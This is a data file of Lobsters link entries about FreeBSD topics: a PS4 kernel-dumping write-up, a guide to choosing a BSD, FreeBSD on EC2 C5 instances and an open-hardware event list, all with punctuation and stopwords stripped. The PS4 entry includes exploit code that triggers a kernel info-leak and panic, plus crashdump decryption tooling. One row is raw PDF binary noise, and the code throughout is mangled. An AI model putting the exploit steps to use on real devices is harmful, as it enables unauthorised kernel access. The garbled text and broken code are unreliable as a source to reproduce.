420,Lobsters,freebsd,FreeBSD,"Dumping a PS4 Kernel in ""Only"" 6 Days",https://fail0verflow.com/blog/2017/ps4-crashdump-dump/,dumping kernel day,crashdumps dumping anything stored crashdump crypto appendix crashdump decoding appendix crashdump automation talk triggering vulnerability fix kind fin appendix crashdump decryptor nxdp decoder,secure device attackerviewable crashdump format device allowed putting arbitrary memory crashdump amazingly tempted fate supporting feature let see turned crashdumps crash handling infrastructure kernel interesting main reason code likely buggy crashdump decoded gain useful info finding bug creating reliable exploit normal freebsd system kernel panic create dump calling kernreboot rbdump flag lead doadump called dump rather tiny amount information kernel image storage device replacement doadump mdbgrundump called panic directly trapfatal amount information stored dump gigantic comparison kernel state process thread vm object included along metadata loaded library obvious change vanilla freebsd method mdbgrundump encodes data recorded dump fieldbyfield basis additionally encrypts resulting buffer finally storing disk dumping anything let zoom special part mdbgrundump iterates process thread try dump pthread state void mdbgrundump struct trapframe frame p allproc p null p curproc plistlenext td p pthreadstqhfirst td null td td tdplisttqenext dumpstate td tdproc void td tdpcb pcbfsbase sysdumpinternalcallreaduser void void dst struct proc p void fsbase int callback void dst struct proc p signed va int len struct pthread tcbthread pthread callback tcbthread p signed fsbase callback pthread p signed tcbthread qword dst qword pthread qword dst qword pthread int sysdumpinternalcallreaduser void dst struct proc p signed va int len const void src rsi struct vmspace vm rcx int rv rax vmpaddrt kva rax src const void va va va userspace get kernel mapping address note va treated signed vm p pvmspace rv efault vm return rv kva pmapextract vm vmpmap va src const void kva signed kva rv efault src src const void va src const void va else rv esrch p return rv still reached even va originally kernel space memcpy dst src len rv return rv dumpstate temporary buffer eventually make crashdump summarize sysdumpinternalcallreaduser made function readanywhere oracle fsbase point owned webkit process usermode address space thus even without changing actual fsbase value may freely change value tcbthread stored fsbase sysdumpinternalcallreaduser happily read kernel address put result dump put kernel location dump still need decrypt decode aside also issue may add byte per thread crashdump crypto crazy news encryption crashdumps use symmetric encryption also tend use key firmware version meant firmware somehow realized probably bad idea reuse symmetric key could exposed kernel dumped versionedkeys needed see appendix point crashdumps still useful however must dump kernel beforehand order obtain key crashdump decoding crashdump encoding know called nxdp symbol present firmware simple run length encoding derivative primitive data type supported functional parser end post see appendix crashdump automation seems like quite bit effort byte per thread wait get better testing found could make thread exist concurrently browser process would either crash hang refuse make thread simple math fulldumpsize crashdumpcycletime minute threadpercrashdumpcycle perdumpsize threadpercrashdumpcycle byte byte fulldumpsize perdumpsize crashdumpcycletime day eventually able cut required time day bit intelligent choosing memory range dump normally dumping software exploit one would linearly dump much possible advantage bringing bs area handy static analysis prerequisite leaking kernel crashdumps taken care set automating procedure could let run without thinking come back day later shiny new kernel dump since kernel store crashdump hard drive needed way either intercept data inflight hard drive rig way read hard drive panic cycle conveniently around time heard work vpikhur done eap detail eap hack scope post see talk detail suffice say eap embedded processor aeolia southbridge vpikhur figured get persistent kernellevel code exec using knowledge gained hack provided replacement eap kernel binary would detect crashdumps hard drive shoot network pc capability small hardware modification connect power switch network simulate input linux usb gadget api able simply script entire process code ran pc spoke web server novena remote server control import request time import socket import parsedump import struct io import bytesio import sys traceback remoteserver novena ip def sendcmd cmd requestsget http remoteserver header remotecmd cmd def dumpindexget open dumpindex f return int fread return def dumpindexset index print setting dumpindex index open dumpindex w f fwrite index def dumpindexincrement index dumpindexget dumpindexset index def processdump partitiondata nxdp parsedumpnxdp bytesio parsedumpdecryptor partitiondata data us recent threadinfo sent http server transpose dump data flat memory dump nxdpdumpthreadleak def recvdump sock socketsocket socketsocket socketafinet socketsockstream sock socksetsockopt socketsolsocket socketsoreuseaddr sockbind socklisten conn addr sockaccept conn magic structunpack l connrecv magic print bad magic length status structunpack connrecv status print bad status data b len data length data connrecv processdump data dumpindexset dumpindexget turn sendcmd power true boot healthy state take second timesleep going browser load exploit crash sendcmd startbrowser wait exploit run power completely timesleep power go fsck boot send error report screen sendcmd power power must pressed twice timesleep sendcmd power timesleep fsck timesleep powerup go past send error report screen sendcmd ackcrash wait xmb load timesleep go rest mode let eap thing sendcmd suspend wait data arrive process try recvdump recving data eap need wait reboot done loop assuming eap sent data ok reboot healthy state dumpindexincrement except expect nxdp data recv decode fail retry position exctype excvalue exctraceback sysexcinfo tracebackprintexception exctype excvalue exctraceback print nxdp decode failed retry triggering vulnerability order progressively dump region wanted created simple json schema record metadata could used tie tids kernel address portion crashdump would contain well maintain base address used perrun getdumpindex snippet j executed browser process order initiate crashdump spawn thread spin modify tcb tcbthread inf loop around nanosleep sec var threadmap var thrcnt thrcnt thrcnt var localbuf scratchptrplus var rv docall gadgetspthreadcreate localbuf symslibkernelinfloopwithnanosleep var thread localbuf var tcb threadplus var tid thread threadmappush tcbthreadptr tcbplus thridx thrcnt tid tid back kernel text aslr var dumpbase new dumpbase dumpbaseplus getdumpindex sync layout dumped memory ordered correctly sendthreadinfo dumpbase threadmap wait thread start delayed start could overwrite tcbthread docall gadgetssleep set tcbthread dumpbase dumpbaseminus var threadmaplength byte tcbthread added dump var threadmap var dumpaddr dumpbaseplus tthridx ttcbthreadptr dumpaddr panic using namedobj bug free invalid pointer kernelfree return panic crashdump would occur would reboot go standard fsck procedure control script would cause enter suspend mode point custom eap kernel would take upload crashdump pc pc crashdump would decrypted parsed order extract leaked byte process would start day fix kind firmware crashdump key generation method finally changed require knowledge asymmetric key order decrypt dump content one first call mdbgrundump make int sysdumpoutputestablishsecurecontextondump int rv eax noncestosign fill globals memcpy noncestosign memcpy noncestosign rv sysdumprsan sysdumprsae noncestosign sysdumprsaencnonces rv bzero sysdumprsaencnonces sysdumphmacctx bzero dumpaesctxiv return rv version sysdumpoutputestablishsecurecontextondump firmware value used crashdump aes key value stored dump within rsa encrypted blob new approach would needed attempt key recovery fin probably convoluted lengthy setup done bug amount infoleak fun experience keep hacking appendix crashdump decryptor decrypts coredump stored custom swap partition gpt uuid bd de look decryptorheadert see cryptocipher import aes cryptohash import hmac import binascii struct construct import def aesecbencrypt k return aesnew k aesmodeecb encrypt def aesecbdecrypt k return aesnew k aesmodeecb decrypt def k return hmacnew k msg digestmod digest def zeropadding size return padding size strict true class rootkeys def init kd kc skd binasciiunhexlify kd skc binasciiunhexlify kc class keyset def init hmackey aeskey shmackey saeskey hmackey aeskey siv len saeskey class decryptor dumpblocklen versionedkeys rootkeys rootkeys probably find rootkeys rootkeys self secureheadert struct secureheader seen version far version kd openpsid byte openpsidenc byte secureheader hashed datahmac byte actual used byte actually written disk zeropadding finalheadert struct finalheader byte unknown unread dump present new dump data state datalen zeropadding byte datahmac headert struct header secureheadert zeropadding secureheadertsizeof finalheadert def keygen openpsid rootkeys openpsidenc aesecbencrypt rootkeyskd openpsid digest rootkeyskc openpsidenc return keyset digest digest def hmacverify keyset hmac hmacnew keysethmackey digestmod open sfpath rb f hmacupdate fread ssecureheadertsizeof datalen sheaderfinalheaderdatalen datalen sdumpblocklen fseek sdumpblocklen hmacupdate fread datalen return hmacdigest sheaderfinalheaderdatahmac return false def unwrapkeyset openpsidenc sheadersecureheaderopenpsidenc version sheadersecureheaderversion rootkeys sversionedkeys version openpsid aesecbdecrypt rootkeyskd openpsidenc digest rootkeyskc openpsidenc keyset keyset digest digest shmacverify keyset print openpsid n binasciihexlify openpsid return keyset return none def init fpath defaultopenpsid none defaultkeysetid none sfpath fpath open sfpath rb f sheader sheadertparsestream f sheaderfinalheaderstate skeyset sunwrapkeyset else something happened dump like consumed reboot case header zerod assert defaultopenpsid none must provide openpsid decrypt dump without secureheader assert defaultkeysetid none must provide keyset id decrypt dump without secureheader rootkeys sversionedkeys defaultkeysetid defaultkeysetid skeyset skeygen defaultopenpsid rootkeys assert skeyset none decrypt reach hmac already verified nt exist open sfpath rb f fseek sdumpblocklen dataenc fread actually always blocksize multiple crashdump usage sdata aesnew skeysetaeskey aesmodecbc skeysetiv decrypt dataenc open debugbin wb fo fowrite sdata nxdp decoder import binascii struct construct import io import bytesio import argparse def signextend value bit signbit bit return value signbit value signbit class nxdpobject object def init obj sparse obj def parse sobj def repr stuff unformatted object sobj isinstance int stuffappend elif isinstance byte stuffappend str binasciihexlify else stuffappend repr return njoin stuff class nxdpkernelinfo nxdpobject kernelversiont struct kernelversion firmwareversion mdbgkernelbuildid zeropadding def parse sver skernelversiontparse def repr fwvermaj sverfirmwareversion fwvermin sverfirmwareversion fwverunk sverfirmwareversion fwver fwvermaj fwvermin fwverunk l lappend kernel version info lappend unk lappend fw version fwver lappend kernel build id svermdbgkernelbuildid return njoin l class nxdpbuffer nxdpobject class buffer def init va buf sva va sbuf buf def parse seems generic subtype ascii string raw byte raw byte array virtual address byte pair sbuftype sbuftype sstrbuf decode ascii elif sbuftype sbufs va size buf assert size len buf sbufsappend sbuffer va buf elif sbuftype sbuf else assert false def repr l lappend buffer begin sbuftype lappend sstrbuf elif sbuftype buf sbufs lappend virtual address length x bufva len bufbuf todo prettyhexdump normally used stack prettyprint stack lappend str binasciihexlify bufbuf ascii elif sbuftype lappend kernel panic summary lappend str binasciihexlify sbuf ascii lappend buffer end return njoin l class nxdpkernelpanic nxdpobject def parse spanicstr decode ascii rstrip n def repr return panic message n spanicstr class nxdpkernelpaniclarge nxdpobject def parse spanicstr decode ascii decode ascii sunks def repr l panic message lappend unk x x x sunks sunks sunks lappend log spanicstr return njoin l class nxdpkerneltrapframe nxdpobject regindices rax rcx rdx rbx rsp rbp rsi rdi rip rflags def parse strapno serr saddr sregs idx val sregsappend idx val def repr l trap frame lappend trapno x strapno lappend err x serr lappend addr saddr reg sregs lappend sregindices reg reg return njoin l class nxdpdumperinfo nxdpobject def parse sunk stid def repr l dumper info lappend unk x sunk lappend tid x stid return njoin l class nxdpprocessinfo nxdpobject def parse spid ssubtypes ssubobjs ssubtypes ssubtypesappend ssubobjsappend nxdpparserparse def repr l process info lappend pid x spid lappend subtypes seen ssubtypes subobj ssubobjs lappend str subobj return njoin l class nxdpscedynlibinfo nxdpobject dynlibinfot struct dynlibinfo sometid flag zeropadding ppid string comm encoding ascii padchar string path encoding ascii padchar byte fingerprint entrypoint psig xxx seems point field added def parse len sdynlibinfotsizeof print unexpected dynlib info size x len sinfo sdynlibinfotparse def repr l library info lappend tid x sinfosometid lappend flag x sinfoflags lappend parent pid x sinfoppid lappend comm sinfocomm lappend path sinfopath lappend fingerprint binasciihexlify sinfofingerprint lappend entrypoint sinfoentrypoint lappend unks dynlib lappend psig sinfopsig lappend unks proc return njoin l class nxdppcb nxdpobject see struct pcb expect dump regindices fsbase rbx rsp rbp rip envxmmt struct envxmm encw ensw entw enzero enopcode enrip enrdp enmxcsr enmxcsrmask svfpt struct svfp byte fpacc todo nonzero padding byte sbz savefpuxstatet struct savefpuxstate xstatebv byte zeropadding byte xstatersrv zeropadding array byte ymmbytes savefpuymmt struct savefpuymm envxmmt array svfpt array byte xmmbytes todo nonzero zeropadding byte sbz savefpuxstatet def parse sflags sfpu ssavefpuymmtparse sregs idx val sregsappend idx val def repr l process control block lappend flag x sflags lappend fpu state sfpu reg sregs lappend sregindices reg reg return njoin l class nxdpprocessthread nxdpobject def parse stid ssubobjs ssubobjsappend nxdpparserparse def repr l thread info lappend tid x stid subobj ssubobjs lappend str subobj return njoin l class nxdpthreadinfo nxdpobject threadinfot struct threadinfo tdpriority tdoncpu tdlastcpu tdwchan thread tdwchan tdstate tdinhibitors string tdwmesg encoding ascii padchar string tdname encoding ascii padchar pid tdcpuset xxx struct size changed byte newstuff def parse sinfo sthreadinfotparse def repr return str sinfo class nxdptitleinfo nxdpobject new object meaning guess def parse stitleid decode ascii rstrip sappid def repr l title info lappend title id stitleid lappend app id x sappid lappend unk value x x return njoin l class nxdpscedynlibimports nxdpobject dynlibimportt struct dynlibimport pid idt index handle zeropadding zeropadding string path encoding ascii padchar zeropadding byte fingerprint zeropadding refcount entrypoint textbase textsize database datasize todo seems nonzero stuff padding def parse xxx added later fw version seems duplicate handle reason sidx across version sinfo sdynlibimporttparse def repr l import info lappend id x sidx lappend str sinfo return njoin l class nxdpvmmap nxdpobject vmmapt struct vmmap start end prot string name encoding ascii padchar xxx added later fw version def parse sinfo svmmaptparse def repr l vm map entry x sinfostart sinfoend sinfoprot sinfoname return l class nxdpkernelrandom nxdpobject def parse sseed sslide def repr l kernel random info lappend seed binasciihexlify sseed lappend slide x sslide return njoin l class nxdpinterruptinfo nxdpobject def parse sfromip stoip def repr l last interrupt ip info lappend x sfromip lappend x stoip return njoin l class nxdpparser processtypes nxdpprocessinfo nxdpprocessthread typeparsers processtypes nxdpscedynlibinfo nxdpthreadinfo sce id table stuff seems removed later fw coredumps nxdpscedynlibimports nxdpvmmap nxdpkernelinfo nxdpbuffer nxdpkernelpanic nxdpkerneltrapframe nxdppcb nxdpdumperinfo nxdpkernelrandom nxdptitleinfo nxdpinterruptinfo nxdpkernelpaniclarge staticmethod def parse obj try f nxdpparsertypeparsers obj l isinstance f dict f f obj l l return f obj l except keyerror return nxdpobject obj class nxdp def init buf sbuf buf snonce sbufread unpacked sdecode srootraw unpacked sparsed unpacked sparsedappend nxdpparserparse def readbyte return structunpack b sbufread def decode print decode x sbuftell idea everything eventually end leaf node represented signedunsigned integer buffer node consist uarray denote child array denote group level b sreadbyte b unsigned immediate return b elif b next byte immediate type b sreadbyte b boolean true return true elif b boolean false return false elif b uarray begin push level item true sdecode none break itemsappend return item elif b uarray end pop level return none else assert false elif b blobrle return sdecodeblobrle id b arg b id unsigned return sdecodeunsigned arg id array range arg aappend sdecode return elif id blob return sdecodeblob arg elif id signed return sdecodesigned arg elif b signed immediate return signextend b else assert false def decodeunsigned n x range n x sreadbyte return x def decodesigned n u sdecodeunsigned n signextend normally used encode kernel address actually return unsugned return u n def decodeblob n n mean length encoded unsigned value n n sdecode return sbufread n def decodeblobrle decompressed size stored first n sdecode always start nt encode anything assert sreadbyte slow simple blob b len blob n b sbufread b count sreadbyte count b sbufread count blob b assert len blob n return blob def dump sparsed print name main parser argparseargumentparser description crashdump parser parseraddargument dumppath parseraddargument openpsid type lambda x binasciiunhexlify x parseraddargument k keysetid type lambda x list map int xsplit args parserparseargs nxdp nxdp bytesio decryptor argsdumppath argsopenpsid argskeysetid data nxdpdump
421,Lobsters,freebsd,FreeBSD,How to choose your *BSD OS to begin with?,https://eerielinux.wordpress.com/2016/08/20/how-to-choose-your-bsd-os-to-begin-with/,choose bsd o begin,freebsd documentation way better linux dear linux user imperative openminded give o way thing chance freebsd pcbsd trueos ghostbsd openbsd netbsd joke pkgsrc rump kernel dragonfly bsd choice like,publishing previous post freebsd documentation way better linux asked bsd recommend somebody know linux new world bsd good question definitely one answered comment reply whole article topic fact rather lengthy one question asked many time net lot people given different answer many recommendation rather old point made may longer apply also often bsd veteran course tend advocate bsd choice newcomer far settled one particular bsd still try explore strong point shortcoming ask linux tempted recommend distro using year come bsds case yet make claim perfectly neutral think write something could value people thinking giving bsd try dear linux user longtime linux user probably remember famous welcome letter window user real classic outdated regard main point still much valid important one applies case well interested another operating system imperative openminded give o way thing chance good idea judge perspective old o quite thing different matter fact able judge certain decision sensible may seem totally weird actually make perfect sense know background gain much knowledge design system bsds direct descendent original unix compared linux much longer history lot lot thing probably explained go back time far enough bsds share common heritage course modernized time also diverged quite bit last two decade make sense write article like one important difference linux world bsd one bsd distribution sure find people use term net likely wrong likely yes arguably bsd special case definitely know debian probably know gentoo two linux distros right sure could also called bsd distribution debian gnulinux debian project also offer debian gnuhurd debian gnukfreebsd latter typical debian distribution gnu userland running top freebsd kernel gentoo story something may call bsd distribution rather linuxy point view linux kernel distribution create full operating system combining userland usually gnu bsds follow whole system approach thing bsd kernel bsd fedora arch linux may use different version configure kernel differently linux kernel source use freebsd kernel openbsd kernel example entirely different kernel even though share common ancestry due whole system approach calling eg netbsd distribution plain wrong reason bsd people probably call idea bsd distribution absurdity first place else know well lot little thing different used drive network interface different name like instead instead command different option andor switch filesystems different unless going try freebsd already used zfsonlinux configuration work differently going meet different init system probably come across lot thing turn work like intended nothing horrible familiar one unixlike system linux bsds unixlikes potential problem driver always use absolutely newest hardware pretty exotic stuff chance linux may fit better bsd project much smaller linux impossible support much hardware however fantastic job manpower try see freebsd try freebsd freebsd bsd operating system largest community important point deciding bsd give try thanks relatively large community offer far widest range software available freebsd base lot commercial product appliance reason receives quite bit funding industry money spent fund project nobody volunteer freebsd hat good support technology like efi nvidia officially support freebsd provides closedsource driver meant onpar window driver interesting need good graphic performance virtualization freebsd excellent choice virtualbox ported freebsd community effort oracle support freebsd host qemu xen available bhyve freebsd even modern hypervisor really promising piece tech lot effort put making arm platform first class citizen freebsd around corner project strives create general purpose operating system free open source permissive license freebsd put lot effort getting rid gpl ed software base system course always install package though gcc replaced llvmclang major platform lot gnu tool alternative implementation existed substituted newly created bsd licensed replacement still work progress plan able offer full operating system permissive licensed time freebsd released freebsd support technology like zfs dtrace mature quite time thing like jail around like forever stable part operating system literally far decade container became thing linux freebsd choose three firewall modified eg multicore optimized variant mighty pf ipfw freebsd native firewall old ipf also freebsd linux emulation pretty sophisticated system expect support linux syscalls latest kernel even though limited emulating older linux kernel still enables run closed source software available linux need general freebsd often characterized extremely stable definitely something however mean rock solid system mind stability eg project follows design principle called pola policy least astonishment reboot machine major upgrade find init system replaced something else also find firewall inactive config format changed newer one load previous rule hard see benefit introducing change gently time loud headsup message instead quietly come supported architecture freebsd concentrate popular one mostly used server freebsd make great desktop want desktop freebsd course install vanilla freebsd add lot package favorite desktop environment however two project provide freebsd based desktop system graphical installer package tuned desktop usage pcbsd trueos ghostbsd former focus modern o lot nifty tool cost available pc force use zfs us qt toolkit default desktop called lumen prefer gtk side thing ghostbsd offer mate xfce desktop environment also support system well older ufs filesystem eg machine little ram excellent choice prefer start complete desktop o explore thing openbsd choose openbsd lot really cool modern without oh get wrong great thing openbsd project focus security correctness reason take high code quality extremely serious reject phenomenon sometimes called featuritis resist temptation implement dozen neat nice thing cost neglecting essential openbsd developer put quite effort maintaining tidy system run across ancient looking code time ask mailing list somebody even use nobody claim disable wait someone screaming needed doubt still useful time bye bye feature give example prove guy really mean long linux emulation completely removed old considered bad state recently tmpfs disabled due lack maintenance may well removed future well course security first believe openbsd afraid throw thing away pretty much every user modern o take granted loadable kernel module always security problem openbsd ripped usermount turned security issue due nature really fixable gone project also take tough stance license matter politics gpl code base system deemed completely unacceptable would expect hardliner living creed openbsd still ship gcc last version base system course install software package even though heavily patch compiler pretty old probably hassle continue maintain binary blob accepted even make something work since would debugable auditable using blob would mean halfassed solution openbsd follows principle right also refuse nondisclosure contract matter principle vendor choose pigheads openbsd usually chooses support hardware period people would probably agree thing right commendable thing may sound bit harsh think exactly seemingly extremist stance brought great benefit u even use openbsd openbsd developer discarded whole lot tool live high standard took effort replace new tool done openbsd way tool like openssh openntpd opensmpd relayd spamd tmux many originated openbsd even created secure webserver simply called httpd since felt nginx getting bloated time project much smaller community compared freebsd really quite achievement also afraid taking quite radical step even mean lot software break solved issue nix system previously openbsd pioneered system wide stack protection aslr wx etc thing major change break lot application openbsd port maintainer noticed application broke due change like always tried least notify upstream project upstream patch already resolved issue make much easier system also make change since biggest fallout already solved thanks openbsd openbsd support quite lot architecture purposely even package exotic platform built machine instead crosscompiling faster metal idea behind case expose subtle bug would gone unnoticed otherwise maintains rather small base system openbsd still come surprisingly complete set tool server duty people say openbsd make perfect router thanks pf firewall may well case quick dismissing desktop usage openbsd developer known devotedly dogfooding system laptop server desktop everything want use graphical system distribution set called xenocara installation cd xenocara hardened version xorg ever need help look manpages breathtaking quality netbsd alright netbsd bsd big community community unfortunately particularly good communicating cool thing used much le two big bsds mentioned might easily miss quite information deemed relevant regular netbsd user first foremost netbsd known portability slogan course run netbsd take look quite impressive list supported hardware project life get greater bsd community bit sooner later hit reference netbsd run every computer toaster think joke perhaps even impressive netbsd portable actually compile netbsd linux system want thing stop probably best known project originated netbsd pkgsrc pronounced package source already idea port system freebsd openbsd think plus course lot effort added make highly portable pkgsrc bootstrap bsds linux solaris osx minix commercial unices aix hpux etc even window using cygwin provides three thing portable package tool portable package creation framework port think package recipe use multiple operating system may tired use different version application since operating system case linux even distribution package application pace pkgsrc may solution since use build install version application platform truth told every port build supported operating system still even depending software need os run quite nice portability netbsd experimenting interesting thing last year example imported small embedded programming language lua kernel case know lua used many place since lightweight easy use lot game embed scripting language example kernel could allow whole lot interesting thing however admit looked thing new firewall npf part netbsd meant highperformance used hear much interesting concept associate netbsd rump kernel netbsd take anykernel concept familiar please reading topic alone would easily deserve article one write since knowledgeable field dragonfly bsd try dragonfly bsd well heart underdog want try dfly first far smallest community four main bsds chance ever run wild pretty low mind even sound great nothing wrong giving dragonfly bsd try fact technical side good reason dragonfly bsd youngest major bsds forked freebsd lead developer agree direction freebsd project took since interested clustering ultrahigh performance computing main aspect drive development dragonfly dragonfly bsd project seems interested creating best performing o possible thing like license matter looking making llvmclang system compiler problem importing gcc system quite time dfly used netbsd pkgsrc official packaging tool freebsd introduced pkgng switched using customized port tree called dports dfly achieved high performance especially networking leading bsd come porting graphic driver linux dropped bit support support bit machine decision made due little manpower project tool called dma dragonfly mail agent originated dragonfly simple replacement sendmail server need send mail local machine however important reason give dragonfly bsd chance offer hammer hammer bsd licensed next generation filesystem bit like zfs regard different others lack zfs advanced feature work well even much le memory even thing zfs finegrained file history hammer considered stable production quality dragonfly something take look filesystems well version hammer filesystem even feature ready yet dragonfly developer openly admit soon interesting enough keep eye especially since version hammer proof enough team implement filesystem rock choice let welcome rich fascinating world bsd first basic impression four main project work like try either one try virtualize use real hardware source always choice please give feedback article andor tell first encounter felt like tried bsd like like loading related
422,Lobsters,freebsd,FreeBSD,FreeBSD/RISC-V and Device Drivers,https://people.freebsd.org/~br/freebsd_riscv.pdf,freebsdriscv device driver,,obj metadata rnames rviewerpreferences r endobj obj endobj obj font xobject procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj endobj obj stream j w l ck ᾢ endstream endobj obj endobj obj endobj obj endobj obj endobj obj endobj obj stream quuupp h l xf n p x pp nӧ sl w æ ũ ϝ c u mǽ pf ڸq
424,Lobsters,freebsd,FreeBSD,FreeBSD/EC2 on C5 instances,http://www.daemonology.net/blog/2017-11-17-FreeBSD-EC2-C5-instances.html,instance,instance family instance view forum thread blog comment powered,instance last week amazon released family instance continuing trend improving performance providing better hardware reducing overhead associated virtualization due significant change new instance family amazon gave advance notice impending arrival several month ago starting august access early version instance could test freebsd unfortunately final launch date took slightly surprise expecting later month still kink need worked freebsd run smoothly instance strongly recommend read rest blog post use freebsd instance possibly skip end interested learning underlying detail ever since first instance launched one retrospectively named amazon relied xen hypervisor longer instance use kvm sound like would problem fact change nt bother freebsd everything us hardwarebased paging virtualization core freebsd kernel barely noticed change would much larger problem image using xen paravirtualized paging provided hardware virtualization new instance type since october usual driver caused problem freebsd xen able provide freebsd xen paravirtualized device privileged virtual machine within physical host access physical disk network freebsd would interact via xen netfrontnetback blkfrontblkback driver lot trick used eke every last scrap performance inevitable performance cost every network packet disk io would need handled freebsd kernel also linux kernel running domain starting year ago amazon offered enhanced networking instance could talk directly network adapter hardware first intel network interface later amazon customdesigned elastic network adapter hardware freebsd gained support ena network interface freebsd thanks amazon taking step proactively looking paying someone port linux driver recently similar passthrough disk original august family arrived february disk always showed xen block device high io family ephemeral disk exposed directly accessible nvme device first time eb volume still exposed xen device block device first hint amazon going something interesting asked freebsd would boot root disk nvme instead xen block device recall answer follows yeah work fine freebsd support nvme disk taste disk read gpt label boot one marked rootfs never hardcoded device name boot disk anywhere wait going work ami boot disk eb volume ca nt copying disk image local nvme disk booting would take long change would orphaned node failed building hardware frontend eb guy insane even rolling software update eb must nightmare scale want add headache dealing hardware top well apparently amazon engineer brave extremely talented eb volume show instance nvme hardware course eb volume nt nvme device herein lie problem attach detach eb volume running instance single api call mouse click prefer gui doubt anyone ever tested hotplug hotunplug physical nvme disk freebsd system moreover absolutely certain nobody ever tested hotplugging hotunplugging physical nvme disk legacy pci bus hanging intel chipset instance look like unsurprisingly untested code path came new interesting bug first problem ran attached detached eb volume nothing happened freebsd nt expecting new device appear disappear pci bus turn sending acpi notification hotplug event compiled freebsd kernel acpi debugging enabled clear happening kernel evqueuenotifyrequest notify handler notify ignoring node freebsd nt listening acpi hotplug notification simply getting dropped floor fortunately freebsd project includes smarter people john baldwin pointed tool devctl rescan prompt freebsd rescan pci bus detect change hardware attaching eb volume running command make new disk promptly appear exactly expected unfortunately detach case nt work quite well removed eb volume ran devctl rescan rather freebsd removing disk got kernel panic turned freebsd nvme driver marking device node eternal allows locking optimization allowed remove device node ok get rid flag recompile try another kernel panic turn completely untested teardown code freeing structure calling function pointer stored within without kernel debugging enabled might worked turned calling good idea ok fix order teardown code recompile try freebsd nt panic instructed rescan pci bus detect nvme disk went away nt remove device node either soon anything touched orphan device node got another kernel panic apparently nobody ever got around finishing nvme device removal code situation follows freebsd version prior freebsd run lack support ena networking hardware xenbased instance earlier freebsd version get virtualized xen networking course available freebsd head midnovember boot run fine long never attach detach eb volume attach detach eb volume reboot see device expect attach eb volume run devctl rescan see new volume detach eb volume run devctl rescan either get immediate kernel panic left device node cause kernel panic soon touched freebsd later everything work last bit depends fixing nvme driver currently worked warner losh confused warren lash completely unrelated character michael lucas git commit murder also depends someone figuring catch acpi event question question finding best way rather finding way worst case could ignore acpi event completely ship amis daemon run bus rescan every second thanks matthew wilson david duncan john baldwin warner losh help figuring thing view forum thread blog comment powered
425,Lobsters,freebsd,FreeBSD,"OSHUG Event #62 - RISC-V, RISC-V, RISC-V",http://oshug.org/,oshug event riscv riscv riscv,open source hardware user group open source hardware discussion list lightning talk bcs ossg agm open source hardware camp inaugural london riscv meetup new cryptography security makerspaces open source fpga hardware tooling past present future machine system past present future mentoring advocacy open source ossg agm member lightning talk printing making open source hardware camp shrimping handbuilt arduino workshop child adult yanking chain open source software compliance supply chain neural compute stick workshop collaborative music making ultralow latency audio sensor processing riscv riscv riscv ossg agm reimagining edsac netbsd update semantic change coupling software class open source hardware camp cheri cpu adding security compiler trust provenance open data getting started netbsd embedded platform pt getting started netbsd embedded platform introduction softwaredefined radio limesdr fpga project past planned possible educating next generation mystorm update micro bit encouraging next generation getting started fpgas verilog using project icestorm mystorm future open source chip design mass musical instrument algorithm picture open source research open source hardware camp drone pt captain buzz whirly blade death bounder open source chip pt nmi open source conference open source least expect embedded platform bsd openwrt plan inferno open energy tool interoperability open inverter opentrv heat pump monitoring security hardware rng pgp key signing party open source hardware camp chip beri need separate hardware construction language opentransputer wiring internet thing raspberry pi nodered hackerspacemakerspacefablab panel discussion radio pt openbeacon hpsdr ruling drone energy exploring open energy electricity woodchips opentrv open source business chip chip design teenager cocotb lowrisc open source hardware camp teaching teaching lilypad raspberry pi education mztek radio networking literacy project everyone radio embedded scripting lua espruino micro python privacy security security protocol constrained environment rfidler indie phone speed overclocking soupedup bbc micro compiler optimisation production proletariat reprap tvrrug open source hardware camp board beautifully functional circuit little printer sensor network contiki low power wireless sensor three writing avr firmware panel lightning talk product nanode industry perspective licensing update embedded erlang parallella compiler option energy consumption open source hardware camp drone openrelief ardrone kinect kit homesense energyefficient computing open compute beagleboard eventdriven xcore practical systemonchip program open source fpga soc manufacturing breadboard finished product arduino shield modular reprap electronics wireless hacking commodity wireless practical wireless contiki o cwig open change hexayurt project onawi open source hardware camp practical approach doublesided pcb design controlling power rgb led controller go canterbury collaboration building community surface mount adventure open change radiation monitoring japan fire bristol braille technology chip programmable logic computer conservation fpgas opencores openrisc performance milkymist learning bbc tinker london home tacticalendar denkimono clock radio hpsdr community mbed designspark london hackspace arduino open source hardware success story open hardware licensing model sustainability introduction xmos xcore amino,open source hardware user group group people shared interest open source hardware hold regular meeting around london welcome suggestion topic speaker future event discussion list event lightning talk bcs ossg agm open source hardware camp inaugural london riscv meetup new cryptography security makerspaces open source fpga hardware tooling past present future machine system past present future mentoring advocacy open source ossg agm member lightning talk printing making open source hardware camp shrimping handbuilt arduino workshop child adult yanking chain open source software compliance supply chain neural compute stick workshop collaborative music making ultralow latency audio sensor processing riscv riscv riscv ossg agm reimagining edsac netbsd update semantic change coupling software class open source hardware camp cheri cpu adding security compiler trust provenance open data getting started netbsd embedded platform pt getting started netbsd embedded platform introduction softwaredefined radio limesdr fpga project past planned possible educating next generation mystorm update micro bit encouraging next generation getting started fpgas verilog using project icestorm mystorm future open source chip design mass musical instrument algorithm picture open source research open source hardware camp drone pt captain buzz whirly blade death bounder open source chip pt nmi open source conference open source least expect embedded platform bsd openwrt plan inferno open energy tool interoperability open inverter opentrv heat pump monitoring security hardware rng pgp key signing party open source hardware camp chip beri need separate hardware construction language opentransputer wiring internet thing raspberry pi nodered hackerspacemakerspacefablab panel discussion radio pt openbeacon hpsdr ruling drone energy exploring open energy electricity woodchips opentrv open source business chip chip design teenager cocotb lowrisc open source hardware camp teaching teaching lilypad raspberry pi education mztek radio networking literacy project everyone radio embedded scripting lua espruino micro python privacy security security protocol constrained environment rfidler indie phone speed overclocking soupedup bbc micro compiler optimisation production proletariat reprap tvrrug open source hardware camp board beautifully functional circuit little printer sensor network contiki low power wireless sensor three writing avr firmware panel lightning talk product nanode industry perspective licensing update embedded erlang parallella compiler option energy consumption open source hardware camp drone openrelief ardrone kinect kit homesense energyefficient computing open compute beagleboard eventdriven xcore practical systemonchip program open source fpga soc manufacturing breadboard finished product arduino shield modular reprap electronics wireless hacking commodity wireless practical wireless contiki o cwig open change hexayurt project onawi open source hardware camp practical approach doublesided pcb design controlling power rgb led controller go canterbury collaboration building community surface mount adventure open change radiation monitoring japan fire bristol braille technology chip programmable logic computer conservation fpgas opencores openrisc performance milkymist learning bbc tinker london home tacticalendar denkimono clock radio hpsdr community mbed designspark london hackspace arduino open source hardware success story open hardware licensing model sustainability introduction xmos xcore amino thanks supporter
